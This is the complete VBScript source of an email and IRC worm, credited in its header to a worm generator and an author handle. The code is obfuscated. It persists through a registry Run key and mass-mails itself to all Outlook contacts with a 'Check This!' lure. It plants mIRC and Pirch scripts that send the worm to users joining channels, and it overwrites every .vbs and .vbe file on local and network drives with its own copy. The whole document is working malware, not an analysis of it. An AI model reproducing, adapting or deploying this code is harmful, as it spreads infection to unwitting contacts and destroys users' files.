'This file Has been created whit Vbs Worms Generator 0.95
'Worm Created By [K]Alamar
On Error Resume Next
Set vtnytovasrl= Createobject("scripting.filesystemobject")
vtnytovasrl.copyfile wscript.scriptfullname,vtnytovasrl.GetSpecialFolder(0)& "\Worm.vbs"
Set esdjqhqjlys = CreateObject("WScript.Shell")
esdjqhqjlys.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm","wscript.exe "&vtnytovasrl.GetSpecialFolder(0)& "\Worm.vbs %"
if esdjqhqjlys.regread ("HKCU\software\Worm\mailed") <> "1" then
yvecozlomst()
end if
if esdjqhqjlys.regread ("HKCU\software\Worm\mirqued") <> "1" then
blmrwtiqzjt ""
end if
if esdjqhqjlys.regread ("HKCU\software\Worm\pirched") <> "1" then
rmcgggibxbq ""
end if
wweghdqxtmc()
Function yvecozlomst()
On Error Resume Next
Set eocelrbibvi = CreateObject("Outlook.Application")
If eocelrbibvi= "Outlook"Then
Set tthygzbobhe=eocelrbibvi.GetNameSpace("MAPI")
For Each nmxiuqoudkv In tthygzbobhe.AddressLists
If nmxiuqoudkv.AddressEntries.Count <> 0 Then
kopoqcfjyfe = nmxiuqoudkv.AddressEntries.Count
For ptfdrsitvzu= 1 To kopoqcfjyfe
Set moplyfculmw = eocelrbibvi.CreateItem(0)
Set knusjqddqvb = nmxiuqoudkv.AddressEntries(ptfdrsitvzu)
moplyfculmw.To = knusjqddqvb.Address
moplyfculmw.Subject = "Here you have, ;o)"
moplyfculmw.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
pzobjwkpmvn.Add vtnytovasrl.GetSpecialFolder(0)& "\Worm.vbs"
moplyfculmw.DeleteAfterSubmit = True
If moplyfculmw.To <> "" Then
moplyfculmw.Send
esdjqhqjlys.regwrite "HKCU\software\Worm\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function blmrwtiqzjt(mejmkqygjkp)
On Error Resume Next
if mejmkqygjkp = "" then
if vtnytovasrl.fileexists("c:\mirc\mirc.ini") then mejmkqygjkp="c:\mirc"
if vtnytovasrl.fileexists("c:\mirc32\mirc.ini") then mejmkqygjkp="c:\mirc32"
bynoehrvqfd=esdjqhqjlys.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if vtnytovasrl.fileexists(bynoehrvqfd & "\mirc\mirc.ini") then mejmkqygjkp=bynoehrvqfd & "\mirc"
end if
if mejmkqygjkp <> "" then
set ddfybfnaaid = vtnytovasrl.CreateTextFile(mejmkqygjkp & "\script.ini", True)
ddfybfnaaid.WriteLine "[script]"
ddfybfnaaid.writeline "n0=on 1:JOIN:#:{"
ddfybfnaaid.writeline "n1=  /if ( $nick == $me ) { halt }"
ddfybfnaaid.writeline "n2=  /.dcc send $nick "&vtnytovasrl.GetSpecialFolder(0)& "\Worm.vbs"
ddfybfnaaid.writeline "n3=}"
ddfybfnaaid.close
esdjqhqjlys.regwrite "HKCU\software\Worm\Mirqued", "1"
end if
end function
function rmcgggibxbq(eanbqpgblgb)
On Error Resume Next
if eanbqpgblgb="" then
if vtnytovasrl.fileexists("c:\pirch\Pirch32.exe") then eanbqpgblgb="c:\pirch"
if vtnytovasrl.fileexists("c:\pirch32\Pirch32.exe") then eanbqpgblgb="c:\pirch32"
ioffyymqxlu=esdjqhqjlys.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if vtnytovasrl.fileexists(ioffyymqxlu & "\pirch\Pirch32.exe") then eanbqpgblgb=ioffyymqxlu & "\pirch\Pirch32.exe"
end if
if eanbqpgblgb <> "" then
set kwflfebkjum= vtnytovasrl.CreateTextFile(eanbqpgblgb & "\events.ini", True)
kwflfebkjum.WriteLine "[Levels]"
kwflfebkjum.WriteLine "Enabled=1"
kwflfebkjum.WriteLine "Count=6"
kwflfebkjum.WriteLine "Level1=000-Unknowns"
kwflfebkjum.WriteLine "000-UnknownsEnabled=1"
kwflfebkjum.WriteLine "Level2=100-Level 100"
kwflfebkjum.WriteLine "100-Level 100Enabled=1"
kwflfebkjum.WriteLine "Level3=200-Level 200"
kwflfebkjum.WriteLine "200-Level 200Enabled=1"
kwflfebkjum.WriteLine "Level4=300-Level 300"
kwflfebkjum.WriteLine " 300-Level 300Enabled=1"
kwflfebkjum.WriteLine "Level5=400-Level 400 "
kwflfebkjum.WriteLine "400-Level 400Enabled=1"
kwflfebkjum.WriteLine "Level6=500-Level 500"
kwflfebkjum.WriteLine "500-Level 500Enabled=1"
kwflfebkjum.WriteLine ""
kwflfebkjum.WriteLine "[000-Unknowns]"
kwflfebkjum.WriteLine "UserCount=0"
kwflfebkjum.WriteLine "EventCount=0"
kwflfebkjum.WriteLine ""
kwflfebkjum.WriteLine "[100-Level 100]"
kwflfebkjum.WriteLine "User1=*!*@*"
kwflfebkjum.WriteLine "UserCount=1"
kwflfebkjum.writeline "Event1=ON JOIN:#:/dcc tsend $nick " & vtnytovasrl.GetSpecialFolder(0) & "\Worm.vbs"
kwflfebkjum.WriteLine "EventCount=1"
kwflfebkjum.WriteLine ""
kwflfebkjum.WriteLine "[200-Level 200]"
kwflfebkjum.WriteLine "UserCount=0"
kwflfebkjum.WriteLine "EventCount=0"
kwflfebkjum.WriteLine ""
kwflfebkjum.WriteLine "[300-Level 300]"
kwflfebkjum.WriteLine "UserCount=0"
kwflfebkjum.WriteLine "EventCount=0"
kwflfebkjum.WriteLine ""
kwflfebkjum.WriteLine "[400-Level 400]"
kwflfebkjum.WriteLine "UserCount=0"
kwflfebkjum.WriteLine "EventCount=0"
kwflfebkjum.WriteLine ""
kwflfebkjum.WriteLine "[500-Level 500]"
kwflfebkjum.WriteLine "UserCount=0"
kwflfebkjum.WriteLine "EventCount=0"
kwflfebkjum.close
esdjqhqjlys.regwrite "HKCU\software\Worm\pirched", "1"
end if
end function
Function wweghdqxtmc()
On Error Resume Next
Set rusyghssxjz = vtnytovasrl.Drives
For Each owmpzdyolml In rusyghssxjz
If owmpzdyolml.Drivetype = Remote Then
ngcgvibjlmi= owmpzdyolml & "\"
Call vjzrpjtokrw(ngcgvibjlmi)
ElseIf owmpzdyolml.IsReady Then
ngcgvibjlmi= owmpzdyolml&"\"
Call vjzrpjtokrw(ngcgvibjlmi)
End If
Next
End Function
Function vjzrpjtokrw(nnhanzfmdle)
Set gtnmjsrcnzc= vtnytovasrl.GetFolder(nnhanzfmdle)
Set agipabfkiwe= gtnmjsrcnzc.Files
For Each oyhezpuutvo In agipabfkiwe
if vtnytovasrl.GetExtensionName(oyhezpuutvo.path) = "vbs" then
vtnytovasrl.copyfile wscript.scriptfullname , oyhezpuutvo.path , true
end if
if vtnytovasrl.GetExtensionName(oyhezpuutvo.path) = "vbe" then
vtnytovasrl.copyfile wscript.scriptfullname , oyhezpuutvo.path , true
end if
Next
Set oyhezpuutvo= gtnmjsrcnzc.SubFolders
For Each kodkjrtvqdl In oyhezpuutvo
Call vjzrpjtokrw(kodkjrtvqdl.path)
Next
End Function
